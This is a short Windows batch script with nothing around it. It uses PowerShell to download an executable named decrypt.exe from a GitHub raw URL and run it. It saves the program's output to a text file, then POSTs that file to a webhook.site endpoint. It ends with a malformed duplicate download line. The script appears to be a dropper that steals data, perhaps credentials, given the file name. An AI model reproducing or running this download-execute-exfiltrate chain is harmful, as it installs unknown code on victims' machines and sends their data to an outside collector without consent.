start cmd.exe /k "powershell -command "$url = 'https://github.com/mortingenstrasse95/mng/raw/main/decrypt.exe'; $output = 'C:/Users/decrypt.exe'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';"


timeout /t 15

start cmd.exe /k powershell -command "C:/Users/decrypt.exe | Out-File -FilePath C:/Users/decrypt.txt ;"

timeout /t 10


start cmd.exe /k powershell -command Invoke-WebRequest -Uri https://webhook.site/2deed7ff-a76b-4776-a15f-128f5bc846f8 -Method POST -InFile C:/Users/decrypt.txt;"

timeout /t 10


exit


Invoke-WebRequest "$url = 'https://github.com/mortingenstrasse95/mng/raw/main/decrypt.exe'; -OutFile 'C:/Users/decrypt.exe';
